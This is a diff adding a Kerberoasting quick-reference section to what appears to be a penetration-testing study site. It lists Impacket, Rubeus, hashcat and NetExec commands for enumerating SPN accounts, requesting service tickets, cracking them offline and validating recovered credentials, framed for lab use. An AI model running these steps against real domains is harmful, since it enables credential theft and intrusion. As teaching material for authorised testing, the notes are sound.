@@ -7,6 +7,104 @@ keywords: ["kerberoasting", "getuserspns", "nxc", "rubeus", "hashcat", "service 
 
 {/* Generated from Active Directory/Reference/Kerberoasting Quick Reference.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Separate account discovery, ticket requests, and offline recovery
+
+Kerberoasting starts with service principals associated with accounts. A ticket artifact is encrypted material suitable for an offline password-recovery attempt under the appropriate conditions; it is not an immediately usable password. Keep the account name, SPN, encryption type and source domain with the artifact.
+
+### Find service accounts before requesting tickets
+
+```powershell
+Get-ADUser -Filter {ServicePrincipalName -like '*'} -Properties ServicePrincipalName,Description,PasswordLastSet
+setspn -T DOMAIN_FQDN -Q */*
+```
+
+```bash
+impacket-GetUserSPNs 'DOMAIN_FQDN/USERNAME' -dc-ip DC_IP
+```
+
+Use a valid lab domain identity. The Impacket form prompts for a password. Computer accounts can also have SPNs; their presence alone does not make them useful password-recovery candidates. Inspect the account purpose and relevant privileges.
+
+### Request and save the relevant ticket material
+
+```bash
+impacket-GetUserSPNs 'DOMAIN_FQDN/USERNAME' -dc-ip DC_IP \
+  -request -outputfile kerberoast.txt
+```
+
+```powershell
+.\Rubeus.exe kerberoast /outfile:kerberoast.txt
+```
+
+Use the collector appropriate to the host and access you have. Confirm that the output actually contains ticket artifacts, not only banners/errors. Limit requests to the exercise scope; broad collection is not necessary when a specific account is the hypothesis.
+
+### Identify the encryption format before selecting a mode
+
+```bash
+head -n 2 kerberoast.txt
+hashcat --example-hashes
+# RC4 Kerberos TGS artifact beginning with $krb5tgs$23$:
+hashcat -m 13100 kerberoast.txt WORDLIST
+hashcat -m 13100 kerberoast.txt --show
+```
+
+The example mode is for that artifact type. AES ticket formats use different modes. An exhausted wordlist means those candidates did not recover a value under that configuration; it does not mean the account does not exist or the ticket is automatically unusable.
+
+### Validate a recovered credential in its scope
+
+```bash
+nxc smb TARGET_IP -d DOMAIN_FQDN -u SERVICE_ACCOUNT -p 'RECOVERED_PASSWORD'
+```
+
+Use one relevant host/protocol first. Then inspect the service account's groups, readable shares and object rights. Recovered credentials are not equivalent to administrator rights. If authentication fails, check domain selection, account status, password changes, logon restrictions and whether the recovered value belongs to the account you selected.
+
+Common false starts are wrong DNS/DC selection, clock disagreement, incorrectly copied artifact lines, mismatched cracking modes, and treating all SPN-bearing accounts as equally useful. Record the precise failure so the next attempt tests a different hypothesis.
+
+## GetUserSPNs.py: choose the operation and read the result
+
+List SPN accounts or request service tickets.
+
+### What the result establishes
+
+Separate listing accounts with SPNs from requesting service tickets for offline analysis.
+
+### Prerequisites and common failures
+
+The returned ticket artifact is not a plaintext password; account encryption, privileges, domain reachability and the selected cracking format affect the next step.
+
+### Example 1: Commands
+
+Run in: **Kali**.
+
+```bash
+impacket-GetUserSPNs 'DOMAIN/USER:PASSWORD' -dc-ip DC_IP
+impacket-GetUserSPNs 'DOMAIN/USER:PASSWORD' -dc-ip DC_IP -request -outputfile tickets.txt
+```
+
+### Example 2: Kerberoasting: Quick Reference
+
+Run in: **Saved lab example**.
+
+```bash
+# Linux (Impacket) — needs any valid domain creds
+GetUserSPNs.py $DOMAIN/USER:PASS -dc-ip $DC -request -outputfile kerb.hash
+# NetExec
+nxc ldap $DC -u USER -p PASS --kerberoasting kerb.hash
+```
+
+Saved context: [Kerberoasting: Quick Reference — Kerberoasting: Quick Reference](/active-directory/kerberoasting). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Practical Application
+
+Run in: **Saved lab example**.
+
+```shell
+GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>
+```
+
+Saved context: [Kerberoasting from Linux — Practical Application](/active-directory/kerberoasting-linux#practical-application). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Existing notes and worked examples
+
 Supplementary quick reference from the existing vault site. It does not mark the module as complete.
 
 > Detailed study notes: [Linux](/active-directory/kerberoasting-linux) · [Windows](/active-directory/kerberoasting-windows). This page is the shorter lookup reference.
